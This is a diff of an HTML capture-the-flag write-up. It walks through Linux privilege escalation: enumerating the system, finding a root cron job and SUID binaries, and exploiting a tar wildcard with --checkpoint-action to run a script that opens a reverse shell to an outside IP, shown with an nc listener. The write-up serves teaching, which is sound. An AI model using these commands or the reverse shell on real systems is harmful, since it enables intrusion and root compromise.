-<p>The first thing I do when I have to do a privilege escalation is to gather as much informations as i can about the server. This is the <code>Operating System</code> section in the cheatsheet. It's really usefull when the server is old and a public exploit is available.</p>
+<p>The first thing I do when I have to do a privilege escalation is to gather as much informations as i can about the server. This is the <code>Operating System</code> section in the cheatsheet. It&rsquo;s really usefull when the server is old and a public exploit is available.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">dark_lottery@9db68003fdde:~$ uname -a
 Linux 9db68003fdde 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
 
@@ -826,7 +827,7 @@ BUG_REPORT_URL=&#34;https://bugs.debian.org/&#34;
 <li>The Linux distro is <code>Debian 9 Strech</code></li>
 <li>The kernel version is <code>#1 SMP Debian 4.9.130-2 (2018-10-27)</code></li>
 </ul>
-<p>Sad&hellip; Debian9 with kernel 4.9 is recent and there's no public exploit to become root.</p>
+<p>Sad&hellip; Debian9 with kernel 4.9 is recent and there&rsquo;s no public exploit to become root.</p>
 <div class="alert protips">
     <i class="logo fas fa-hand-holding-heart"></i>
     <p class="text"><strong>ProTips</strong> : To do a fast reasearch on exploitdb, I recommend you to install searchsploit binary. It will allow you to search very quickly an exploit . More info here : https://github.com/offensive-security/exploitdb 
@@ -883,8 +884,8 @@ drwxr-xr-x 1 root root 4096 Dec 20 18:27 .
 </code></pre><p>Oh ! Look at this. Some crontabs ! There is no interesting things in <code>cron.daily</code> (except the presence of unusual exim4 crontab). But look at <code>backup-cron</code> crontab.</p>
 <pre><code>dark_lottery@9db68003fdde:/etc$ cat /etc/cron.d/backup-cron 
 * * * * * /bin/sh /backup.sh
-</code></pre><p>The crontab <code>backup-cron</code> launch every minutes with root privilege the script <code>/backup.sh</code>. I think we've got a good way here ! But for now, we have to finish our investigation.</p>
-<p>The next section in the cheatsheet is <code>Communications &amp; Networking</code>. In CTF, is really rare to have to deal with networks but it's possible. So keep it in mind !</p>
+</code></pre><p>The crontab <code>backup-cron</code> launch every minutes with root privilege the script <code>/backup.sh</code>. I think we&rsquo;ve got a good way here ! But for now, we have to finish our investigation.</p>
+<p>The next section in the cheatsheet is <code>Communications &amp; Networking</code>. In CTF, is really rare to have to deal with networks but it&rsquo;s possible. So keep it in mind !</p>
 <p>Next section is <code>Confidential Information &amp; Users</code>. This part is important because you will probably find some interesting things like informations in .bash_history, mail or private key.</p>
 <div class="alert protips">
     <i class="logo fas fa-hand-holding-heart"></i>
@@ -893,14 +894,14 @@ drwxr-xr-x 1 root root 4096 Dec 20 18:27 .
     </p>
 </div>
 <p>And the last section talk about <code>File Systems</code>. This part is also important because we can find interesting data in software log, webserver&hellip;
-But the most interesting part is file permission. So let's try this !</p>
+But the most interesting part is file permission. So let&rsquo;s try this !</p>
 <p>Some vocabulary :</p>
 <ul>
 <li><strong>Sticky bit</strong> : Only the owner of the directory or the owner of a file can delete or rename here.</li>
 <li><strong>SUID</strong> : run as the owner, not the user who started it. The file will be execute with the owner right</li>
 <li><strong>SGID</strong> : run as the group, not the user who started it. The file will be execute with the group right.</li>
 </ul>
-<p>In privesc, often the more usefull is suid permission. Let's check that.</p>
+<p>In privesc, often the more usefull is suid permission. Let&rsquo;s check that.</p>
 <pre><code>dark_lottery@9db68003fdde:/etc$ find / -perm -u=s -type f 2&gt;/dev/null 
 /bin/ping
 /bin/su
@@ -914,7 +915,7 @@ But the most interesting part is file permission. So let's try this !</p>
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /usr/lib/openssh/ssh-keysign
 /usr/sbin/exim4
-</code></pre><p>Haha <code>ping</code> is suid but it's a wrong way. Look at <code>exim4</code> binary. It's sometimes possible to do privesc with that. What is <code>exim</code> ?</p>
+</code></pre><p>Haha <code>ping</code> is suid but it&rsquo;s a wrong way. Look at <code>exim4</code> binary. It&rsquo;s sometimes possible to do privesc with that. What is <code>exim</code> ?</p>
 <p><code>Exim4 is a very complete mail server, it is the default mail server on Debian. It allows to receive and send mails. It can be configured as server and / or client.</code></p>
 <pre><code>dark_lottery@9db68003fdde:/etc$ ls -al /usr/sbin/exim4
 -rwsr-xr-x 1 root root 1019656 Feb 10  2018 /usr/sbin/exim4
@@ -957,7 +958,7 @@ cd /opt/src/ <span style="color:#f92672">&amp;&amp;</span> /bin/tar -cvzf /backu
 <li>Set read only recursively on <code>/backups</code> for user and group root</li>
 </ol>
 <p>So ? Where is the exploit ? Look carefully this line : <code>tar -cvzf /backups/bck-src.tar.gz *</code></p>
-<p>You really don't see ? Return to our cheatsheet : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Tar%20commands%20execution">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Tar%20commands%20execution</a></p>
+<p>You really don&rsquo;t see ? Return to our cheatsheet : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Tar%20commands%20execution">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Tar%20commands%20execution</a></p>
 <p><em><code>By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that’s where the wildcard comes in handy.</code></em></p>
 <p>We will exploit <code>*</code> tar wildcard. Juste watch and learn ! The <code>'--checkpoint-action'</code> option, that will specify program which will be executed when checkpoint is reached.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Go to the directory where everything is tar</span>
@@ -977,7 +978,7 @@ echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/12.34.56.78/444
 
 <span style="color:#75715e"># Set execution</span>
 chmod +x shell.sh
-</code></pre></div><p>And set your listener on your attacker's server</p>
+</code></pre></div><p>And set your listener on your attacker&rsquo;s server</p>
 <pre><code>[th1b4ud@th1b4ud-pc ~]$ nc -lvp 4444
 listening on [any] 4444 ...
 connect to [192.168.0.50] from 113.ip-51-75-202.eu [51.75.202.113] 34982
@@ -1004,11 +1005,11 @@ IMTLD{R04d_T0_Th3_sW1tCH}
 <p>Wow already 1000 lines ! I speak too much :D
 So what do we learned with this challenge ?</p>
 <ul>
-<li>Exploiting an LFI vulnerability to get the webserver's source code.</li>
+<li>Exploiting an LFI vulnerability to get the webserver&rsquo;s source code.</li>
 <li>Understanding the source code to exploit an sqli vulnerability.</li>
-<li>Learn to use CAREFULLY Sqlmap to dump database's content.</li>
+<li>Learn to use CAREFULLY Sqlmap to dump database&rsquo;s content.</li>
 <li>Break weak password on zip archive.</li>
-<li>Understanding VeraCrypt's containers manipulation.</li>
+<li>Understanding VeraCrypt&rsquo;s containers manipulation.</li>
 <li>Install and use TOR.</li>
 <li>Exploit XXE out of band vulnerability.</li>
 <li>Find server critical information remotely.</li>
